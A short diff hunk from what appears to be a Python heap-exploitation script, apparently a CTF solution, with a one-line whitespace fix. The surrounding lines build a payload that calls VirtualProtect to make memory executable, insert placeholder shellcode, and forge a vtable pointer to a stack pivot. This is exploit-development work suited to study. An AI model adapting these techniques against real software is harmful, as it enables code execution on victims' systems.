@@ -162,7 +162,7 @@ food_a += p(0x5000)           #  arg2: dwSize
 food_a += p(0x40)             #  arg3: flNewProtect(PAGE_EXECUTE_WRITEREAD)
 food_a += p(heap_base)        #  arg4: lpflOldProtect(anywhere in edit buffer)
 food_a += "\x90\x90\x90\xcc"  # shellcode
-food_a = food_a.ljust(0x248) # padding
+food_a = food_a.ljust(0x248)  # padding
 victim = p(heap+0x648)        # vtable pointer(address of stack pivot)
 victim += victim.ljust(0x230) # padding(sizeof(Victim FOOD))
 
